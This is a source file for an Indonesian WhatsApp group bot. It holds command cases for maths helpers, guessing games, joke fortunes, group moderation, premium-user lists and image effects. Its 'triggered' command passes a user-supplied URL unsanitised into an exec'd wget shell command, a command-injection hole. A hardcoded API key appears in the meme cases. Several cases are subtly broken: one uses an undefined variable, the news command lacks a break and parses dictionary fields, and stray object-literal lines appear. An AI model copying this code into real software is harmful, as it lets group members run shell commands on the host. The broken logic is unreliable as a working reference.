case 'kel-segitiga':
fakey(mess.wait)
if (!q) return m.reply(`Untuk mencari Hasil dari keliling segitiga\nGunakan ${prefix}kelsegitiga sisi1 sisi2 sisi3\nContoh: ${prefix}kelsegitiga 32 10 8`)
     if (!isInventoryLimit){ addInventoriLimit(m.sender) }
     if (isLimit < 1) return reply("Limit kamu sudah habis ಥ╭╮ಥ, silahkan beli dengan cara #buy limit _jumlah_")
     kurangLimit(m.sender, 1)
     reply(`Satu limit terpakai ಥ‿ಥ\nSisa limit kamu : ${getLimit(m.sender)}`)
try {
const kelsegitiga = bdr.datar.keliling.segitiga(args[0], args[1], args[2], false)
const carakel = bdr.datar.keliling.segitiga(args[0], args[1], args[2], true)
m.reply(`*Hasil:* ${kelsegitiga}\n*Rumus:* ${carakel}`)
} catch (err) {
m.reply('Format pesannya salah tuh')
}
break
case 'luas-persegi':

if (!q) return m.reply(`Untuk mencari Hasil dari luas persegi\nGunakan ${prefix}luaspersegi angka\nContoh: ${prefix}luaspersegi 32`)
try {
const luaspersegi = bdr.datar.luas.persegi(q, false)
const luaspersegis = bdr.datar.luas.persegi(q, true)
m.reply(`*Hasil:* ${luaspersegi}\n*Rumus:* ${luaspersegis}`) 
} catch (err) {
m.reply('Format pesannya salah tuh') 
}
break
case 'pythagoras':

if (!q) return m.reply(`Untuk mencari hasil pythagoras\nGunakan ${prefix}pythagoras opsi angka1 angka2\nContoh: ${prefix}pythagoras miring 8 6`) 
try {
const pytha = bdr.rdb.pythagoras(args[0], args[1], args[2], false)
const rumuspytha = bdr.rdb.pythagoras(args[0], args[1], args[2], true)
m.reply(`*Hasil:* ${pytha}\n*Rumus:* ${rumuspytha}`) 
} catch (err) {
m.reply('Format pesannya salah tuh') 
}
break
case 'perkalian':

if (!q) return m.reply(`Untuk mencari hasil perkalian\nGunakan ${prefix}perkalian angkaperkalian jumlahperkalian\nContoh: ${prefix}perkalian 5 15`) 
try {
const perkal = bdr.rdb.perkalian(args[0], args[1])
reply(`*Hasil:* ${perkal}\n*Rumus:* ${rumusperkal}`) 
} catch (err) {
m.reply('Format pesannya salah tuh') 
}
break
case 'kel-persegi':

if (!q) return m.reply(`Untuk mencari Hasil dari keliling persegi\nGunakan ${prefix}kelpersegi angka\nContoh: ${prefix}kelpersegi 78`)
try {
const persegi = bdr.datar.keliling.persegi(q, false)
const caraPersegi = bdr.datar.keliling.persegi(q, true)
reply(`*Hasil:* ${persegi}\n*Rumus:* ${caraPersegi}`) 
} catch (err) {
m.reply('Format pesannya salah tuh') 
}
break
case 'kuadrat':
if (!q) return m.reply(`Untuk mencari sebuah Hasil Kuadrat\nGunakan ${prefix}kuadrat angka\nContoh: ${prefix}kuadrat 6`) 
try {
const kuadrat = bdr.rdb.kuadrat(q)
reply(`*Hasil:* ${kuadrat}`) 
} catch (err) {
m.reply('Format pesannya salah tuh') 
}
break
case 'kubik':
if (!q) return m.reply(`Untuk mencari sebuah Hasil Kubik\nGunakan ${prefix}kubik angka\nContoh: ${prefix}kubik 9`) 
try {
const kubik = bdr.rdb.kubik(q)
reply(`*Hasil:* ${kubik}`) 
} catch (err) {
m.reply('Format pesannya salah tuh') 
}
break
	    case 'family100': {
                if ('family100'+m.chat in _family100) {
                    m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
                    throw false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await danta.sendText(m.chat, hasil, m),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break
            case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
            if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
            case 'tebak': {
                if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
                if (args[0] === "lagu") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    let msg = await danta.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    danta.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    danta.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, danta.user.name, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    danta.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    danta.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, danta.user.name, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    danta.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    danta.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, danta.user.name, m)
                    delete tebakkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    danta.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    danta.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, danta.user.name, m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    danta.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    danta.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, danta.user.name, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lontong') {
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    danta.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    danta.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, danta.user.name, m)
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
                    }
                }
            }
            break
            case 'kuismath': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let { genMath, modes } = require('./src/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ╠➥ ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                danta.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            
//Pembatas===============================================
            case 'slot': {
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            let sloth =`[  🎰VIRTUAL SLOT 🎰  ]\n------------------------\n\n🍒 : 🍌 : 🍇\n${somtoy}<=====\n🍇 : 🍌 : 🍒\n\n------------------------\n[  🎰 VIRTUAL SLOT 🎰  ]\n\n*Keterangan* :\n_Jika Mendapatkan 3Buah Sama_\n_Berarti Kamu Win_\n\n_Contoh : 🍒 : 🍒 : 🍒_ <=====`
            let buttons = [{ buttonId: 'slot', buttonText: { displayText: '🎰MAIN LAGI🎰' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, sloth, nyoutube, m)
            }
            break
            case 'jodohku': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await danta.sendButtonText(m.chat, buttons, jawab, danta.user.name, m, {mentions: ments})
            }
            break
            case 'jadian': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `Ciee yang Jadian💖 Jangan lupa Donasi🗿

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: 'jadian', buttonText: { displayText: 'Jadian' }, type: 1 }
                    ]
                    await danta.sendButtonText(m.chat, buttons, jawab, nyoutube, m, {mentions: menst})
            }
            break
            case 'gbtku': {
            if (!isPremium) throw mess.premime
			if (!text) throw `Example : ${prefix + command} hai|halo`
            let jawab = `${text.split("|")[0]}`
            let buttons = [{ buttonId: 'menu', buttonText: { displayText: `` }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, jawab, `${text.split("|")[1]}`, m)
            }
            break
            case 'bisakah': {
            	if (!text) throw `Example : ${prefix + command} saya menang?`
            	let bisa = ['Bisa','Coba Saja','Pasti Bisa','Mungkin Saja','Tidak Bisa','Tidak Mungkin','Coba Ulangi','Ngimpi kah?','yakin bisa?']
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Bisakah ${text}*\nJawab : ${keh}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'SABAR🗿' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, jawab, nyoutube, m)
            }
            break
            case 'apakah': {
            	if (!text) throw `Example : ${prefix + command} saya bisa menang?`
            	let apa = ['Iya','Tidak','Bisa Jadi','Coba Ulangi','Mungkin Saja','Coba Tanyakan Ayam']
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Apakah ${text}*\nJawab : ${kah}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, jawab, nyoutube, m)
            }
            break
            case 'kapan': case 'kapankah': {
            	if (!text) throw `Example : ${prefix + command} saya menang?`
            	let kapan = ['Besok','Lusa','Nanti','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi','Bulan Depan','Nanti','Tidak Akan Pernah']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nJawab : ${koh}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'SABAR🗿' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, jawab, nyoutube, m)
            }
            break
            
           
//PEMBATAS=======================================
            case 'totalfitur': case 'totalfiture': case 'fiture': case 'fitur': {
            	m.reply('*Total Ada 231 Fitur*\n_Ketik Req Untuk Request Fitur_')
            }
            break
            case 'req': case 'request': {
            	if (!text) throw `Example : ${prefix + command} Fitur Min`
               let ownernya = ownernomer + '@s.whatsapp.net'
               let me = m.sender
               let pjtxt = `Pesan Dari : @${me.split('@')[0]} \nUntuk : @${ownernya.split('@')[0]}\n\n${command} ${text}`
               let ments = [ownernya, me]
               let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: '🙏THANKS' }, type: 1 }]
            await danta.sendButtonText(ownernya, buttons, pjtxt, nyoutube, m, {mentions: ments, quoted: fdoc})
            let akhji = `*Request Telah Terkirim*\n*Ke Owner @${ownernya.split('@')[0]}*\n_Terima Kasih🙏_`
            await danta.sendButtonText(m.chat, buttons, akhji, nyoutube, m, {mentions: ments, quoted: fkontak})
            }
            break
            case 'react': {
                if (!isCreator) throw mess.owner
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                danta.sendMessage(m.chat, reactionMessage)
            }
            break  
            case 'join': {
                if (!isCreator) throw mess.owner
                if (!text) throw 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                m.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await danta.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
case 'antitag': {
if (!isCreator) throw mess.owner
if (!text) return reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (antitags === true) return
global.antitags = true
reply(`Berhasil mengaktifkan antitag!`)
} else if (args[0] === 'off') {
if (antitags === false) return
global.antitags = false
ads(`Berhasil menonaktifkan antitag!`)
} else {
reply('Pilih on atau off')
}
}
break
            case 'leave': {
                if (!isCreator) throw mess.owner
                await danta.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'setexif': {
               if (!isCreator) throw mess.owner
               if (!text) throw `Example : ${prefix + command} packname|author`
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          m.reply(`Exif berhasil diubah menjadi\n\n⭔ Packname : ${global.packname}\n⭔ Author : ${global.author}`)
            }
            break
case 'pantun':  
                   if (!isPremium) throw mess.premime
                   fromMe: false,
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/random_pantun`)
                   anu = `*PANTUN* : ${anu.result}\n` 
                   m.reply(anu)
                   break 
case 'meme':{
if (!isPremium) throw mess.premime
fromMe:false,
anu = await getBuffer(`https://api.xteam.xyz/randomimage/meme?APIKEY=apivproject`)
danta.sendMessage(m.chat, { image: anu, caption: `🗿` }, { quoted: m}).catch((err) => m.reply('Link Sedang Eror! Coba Lagi Nanti'))
}
break
case 'meme2':{
if (!isPremium) throw mess.premime
fromMe:false,
anu = await getBuffer(`https://api.xteam.xyz/randomimage/meme2?APIKEY=apivproject`)
danta.sendMessage(m.chat, { image: anu, caption: `bilek` }, { quoted: m}).catch((err) => m.reply('Link Sedang Eror! Coba Lagi Nanti'))
}
break
case 'tribun':
if (!isPremium) throw mess.premime
fromMe:false,
TribunNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\nBerita ${no.toString()} Tribun\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
danta.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })
})
break
case 'berita':
			if (args.length == 0) throw (`Example: ${prefix + command} sabar`)
				kueri = args.join(" ")
			get_result = await fetchJson(`https://myselfff.herokuapp.com/docs/news/berita?query=${kueri}`)
			get_result = get_result.result
			ini_txt = `⭔ Nama : ${get_result[0].nama}\n`
			ini_txt += `⭔ Nomor : ${get_result[0].nomor}\n`
			ini_txt += `⭔ Kata Dasar : ${get_result[0].kata_dasar}\n`
			ini_txt += `⭔ Pelafalan : ${get_result[0].pelafalan}\n`
			ini_txt += `⭔ Bentuk Tidak Baku : ${get_result[0].bentuk_tidak_baku}\n`
			ini_txt += `⭔ Varian : ${get_result[0].varian}\n\n`
			ini_txt += `*MAKNA*\n`
			for (var x of get_result) {
				ini_txt += `*Kelas :* \n`
				ini_txt += `⭔ Kode : ${x.makna[0].kelas[0].kode}\n`
				ini_txt += `⭔ Nama : ${x.makna[0].kelas[0].nama}\n`
				ini_txt += `⭔ Deskripsi : ${x.makna[0].kelas[0].deskripsi}\n\n`
				ini_txt += `⭔ Submakna : ${x.makna[0].submakna[0]}\n\n`
				ini_txt += `⭔ Contoh : ${x.makna[0].contoh[0]}\n\n`
			}
			m.reply(ini_txt)
case 'shopee': {
if (!isPremium) throw mess.premime
if (!text) throw `shopee [query]`
nyz57 = await fetchJson(`https://myselfff.herokuapp.com/docs/search/shopee?query=${q}`)
nyz58 = nyz57.result
nyz59 = `[ SHOPEE ]\n`,
nyz59 += `=> *JUDUL* : ${nyz58.judul}\n`,
nyz59 += `=> *HARGA* : ${nyz58.harga}\n`,
nyz59 += `=> *MERK* : ${nyz58.merk}\n`,
nyz59 += `=> *STOCK* : ${nyz58.stock}\n`,
nyz59 += `=> *LIKE* : ${nyz58.like}\n`,
nyz59 += `=> *VIEWS* : ${nyz58.views}\n`,
nyz59 += `=> *TERJUAL* : ${nyz58.terjual}\n`
m.reply(nyz59)
}
break
	case 'kick': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await danta.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
    case 'addprem':
				if (!isCreator) return m.reply(mess.owner)
				{ q, args } {
				if (args.length < 2)
				return m.reply(
				`Penggunaan :\n*#addprem* @tag waktu\n*#addprem* nomor waktu\n\nContoh : #addprem @tag 30d`
				);
				if (m.mentionedJid.length !== 0) {
				for (let i = 0; i < m.mentionedJid.length; i++) {
				prem.addPremiumUser(m.mentionedJid[0], args[1], premium);
						}
				danta.sendMessage(m.chat, { text: "Sukses Premium" }, { quoted: fkontak });
					} else {
				prem.addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
				danta.sendMessage(m.chat, { text: "Sukses Via Nomor" }, { quoted: fkontak });
						}
					}
				break
			case 'delprem':
				if (!isCreator) return m.reply(mess.owner)
				{ q, args, arg } {
				if (args.length < 1) return reply(`Penggunaan :\n*#delprem* @tag\n*#delprem* nomor`);
				if (m.mentionedJid.length !== 0) {
					for (let i = 0; i < m.mentionedJid.length; i++) {
						premium.splice(prem.getPremiumPosition(m.mentionedJid[i], premium), 1);
						fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
					}
					danta.sendMessage(m.chat, { text: "Sukses Delete" }, { quoted: fkontak });
				} else {
				premium.splice(prem.getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
				fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
				danta.sendMessage(m.chat, { text: "Sukses Via Nomer" }, { quoted: fkontak });
				}
				}
				break
		case 'listprem': {
			if (!isCreator) return m.reply(mess.owner)
			let data = require("./database/premium.json")
			let txt = `*------「 LIST PREMIUM 」------*\n\n`
                    for (let i of data) {
                txt += `*Nomer : ${i.id}*\n*Expired : ${i.expired} Second*\n\n`
                }
            m.reply(txt)
			}
			break
	case 'add': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await danta.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await danta.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await danta.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'block': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await danta.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
		m.reply('done')
	}
	break
        case 'unblock': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await danta.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
		m.reply('succes unblock')
	}
	break
	    case 'setname': case 'setsubject': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await danta.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await danta.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setppbot': {
                if (!isCreator) throw mess.owner
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await danta.downloadAndSaveMediaMessage(quoted)
                await danta.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
           case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
let media = await danta.downloadAndSaveMediaMessage(quoted)
try {
if (args[0] == "/full") {
const { generateProfilePicture } = require("./lib/myfunc")
var { img } = await generateProfilePicture(media)
await danta.query({ tag: 'iq',attrs: { to: m.chat, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
} else { await danta.updateProfilePicture(m.chat, { url: media }) }
anjay(mess.success)
} catch { anjay('Gagal Mengganti Photo Profile') }
}
break
            case 'gayeffect': {
	            if (!/image/.test(mime)) return reply(`*Send/Reply Image With Caption* ${prefix + command}`)
	        	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader2')
                let media = await danta.downloadAndSaveMediaMessage(quoted)                
                let anu = await TelegraPh(media)
                let buf = await getBuffer(`https://cililitan.herokuapp.com/api/gay?url=${anu}`)
                danta.sendMessage(m.chat, { image: buf, caption: `Made by DANTA` }, { quoted: m}).catch ((err) => reply(mess.error))
                }
                break
            case 'savefrom': {
  if (!text) return m.reply(`Failed to download media and send audio ${prefix + command} url link`) 
  if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(`The link you provided is invalid`)
  //let noh = require('@bochilteam/scraper')                
  noh.savefrom(`${text}`).then(async (data) => {
  let sections = []   
  for (let i of data.url) {
  const list = {title: `${i.type}`,
  rows: [
	    {
	     title: `Quality ${i.subname}`, 
	     rowId: `╠➥ ${prefix}get ${text}`,
      description: `${data.hosting}`	     
	    }, 
	    ]
     }
     sections.push(list)   
     }
  const sendm =  danta.sendMessage(
      m.chat, 
      {
       text: `${data.meta.title} *Here is the list of videos, click the button below to choose*`,
       footer: `DANTA`,
       title: "*SAVE FROM*",
       buttonText: "CLICK HERE",
       sections
      }, { quoted : m })                 
                }).catch((err) => {
                    reply(mess.error)
                })
            }
            break
            case 'triggered':
                    ini_url = args[0]
                    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    buffer = `http://api.lolhuman.xyz/api/editor/triggered?apikey=${command}&img=${ini_url}`
                    exec(`wget "${buffer}" -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        danta.sendMessage(from, buff, sticker, { quoted: m })
                        fs.unlinkSync(rano)
                    })
                    break
            case 'jail': case 'pixelate': case 'blur': case 'imagesketch': case 'triggeredwebp': case 'shit': case 'burn': case 'invert': case 'wanted': case 'rip': {
	            if (!/image/.test(mime)) return reply(`*Send/Reply Image With Caption* ${prefix + command}`)
	        	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader2')
                let media = await danta.downloadAndSaveMediaMessage(quoted)                
                let anu = await TelegraPh(media)
                let buf = await getBuffer(`https://cililitan.herokuapp.com/api/${command}?url=${anu}`)
